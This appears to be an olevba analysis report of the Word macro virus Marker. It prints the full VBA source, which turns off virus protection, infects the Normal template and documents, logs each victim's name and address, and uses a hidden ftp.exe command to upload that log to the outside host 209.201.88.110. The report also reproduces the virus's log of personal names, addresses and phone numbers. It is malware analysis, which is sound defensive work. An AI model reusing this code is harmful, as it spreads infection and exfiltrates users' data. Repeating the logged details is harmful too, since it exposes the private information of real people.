olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-4517ee7383443c4d06ba1ff5bee706d69065f9ea
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-4517ee7383443c4d06ba1ff5bee706d69065f9ea - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
Applicaton.Quit

End Sub

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:37:56 AM - Tuesday, 29 Dec 1998
' Dan Ross
'



' 09:50:06 AM - Monday, 11 Jan 1999
' Karen M. Pinks
'



' 04:41:03 PM - Thursday, 21 Jan 1999
' george w. connelly
'



' 02:47:55 PM - Friday, 22 Jan 1999
' Michael L. Pusey
'



' 08:24:22 AM - Sunday, 24 Jan 1999
' Andrea F. Walker
'



' 08:21:33 PM - Sunday, 24 Jan 1999
' Brian Turner
'



' 01:46:46 PM - Tuesday, 26 Jan 1999
' Brad Englert
' Andersen Consulting LLP
' 701 Brazos, Suite 1000
' Austin, TX  78701



' 10:11:06  - Wednesday, 27 Jan 1999
' Tracy Anne Gawthorne
'



' 07:50:13  - Thursday, 28 Jan 1999
' Bhrona Long
'



' 07:00:15  - Wednesday, 3 Feb 1999
' Lorraine H. Groves
'



' 04:40:39  - Tuesday, 9 Feb 1999
' Esther Bowes
'



' 08:23:24  - Thursday, 18 Feb 1999
' BT
'



' 01:06:06  - Tuesday, 2 Mar 1999
' BT
'



' 02:28:45  - Wednesday, 3 Mar 1999
' BT
'



' 01:07:03  - Thursday, 4 Mar 1999
' Gill Ketley
'



' 09:59:48  - Friday, 5 Mar 1999
' BT
'



' 04:18:41  - Tuesday, 9 Mar 1999
' BT
'



' 03:09:00  - Wednesday, 10 Mar 1999
' BT
'



' 04:18:47  - Friday, 19 Mar 1999
' PITO
'



' 09:09:00  - Tuesday, 6 Apr 1999
' Simon Harlow
'



' 09:11:56  - Wednesday, 7 Apr 1999
' D. Barnfather
'



' 04:44:35  - Monday, 26 Apr 1999
' S. Gowlett
'



' 11:14:57  - Wednesday, 28 Apr 1999
' 01659
'



' 09:02:33  - Thursday, 20 May 1999
' Estates
'



' 01:46:22  - Wednesday, 2 Jun 1999
' 11237
'



' 04:44:41  - Thursday, 10 Jun 1999
' 11257
'



' 11:33:00  - Wednesday, 7 Jul 1999
' DSU
'



' 05:58:06  - Friday, 2 Oct 1998
' P.C. O'beirne
' If undelivered please return to:
' 14 Roeburn Drive
' Morecambe
' Lancashire
' LA3 3RY



' 03:39:32  - Tuesday, 14 Dec 1999
' Heysham High School
'



' 01:45:56  - Wednesday, 15 Dec 1999
' Heysham High School
'



' 12:58:51  - Thursday, 16 Dec 1999
' Heysham High School
'



' 05:42:02 PM - Thursday, 20 Jan 2000
' Dunn
'



' 11:24:36  - Tuesday, 25 Jan 2000
' Heysham High School
'



' 02:26:29  - Wednesday, 14 Jun 2000
' Heysham High School
'



' 09:53:19  - Friday, 15 Sep 2000
' bennett andrew
'



' 11:28:00  - Tuesday, 3 Oct 2000
' Heysham High School
'



' 11:02:36  - Thursday, 19 Oct 2000
' jackson mark
'



' 02:12:33  - Monday, 22 Jan 2001
' Heysham High School
'



' 07:02:33 PM - Tuesday, 1 May 2001
' jean  levey
'



' 01:09:49  - Thursday, 14 Jun 2001
' A Cabinet Office User
'



' 03:34:22  - Monday, 25 Jun 2001
' ALDRIDGE
'



' 04:09:02  - Monday, 25 Jun 2001
' ahmed
'



' 09:39:06  - Tuesday, 26 Jun 2001
' Fiona McKay
'



' 10:38:39  - Tuesday, 26 Jun 2001
' A Cabinet Office User
'



' 09:36:56  - Wednesday, 27 Jun 2001
' Christopher Wood
'



' 01:44:58  - Wednesday, 27 Jun 2001
' A Cabinet Office User
'



' 03:09:24 PM - Wednesday, 27 Jun 2001
' Any Authorised User
' Jim Farquhar
' GLASGOW BASIS
' 3rd Floor
' 123-157 Bothwell Street
' GLASGOW



' 10:29:03  - Wednesday, 4 Jul 2001
' STANDARD_PC
'



' 04:45:35  - Wednesday, 11 Jul 2001
' Robin Dodd
' 6th Floor  Five Ways House  Islington Row  Edgbaston  Birmingham  B15 1SL
' Tel 0121 626 3756  Fax 0121 626 3039  Email BAS(IS)



' 08:53:01 AM - Thursday, 9 Aug 2001
' Ditry PC
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

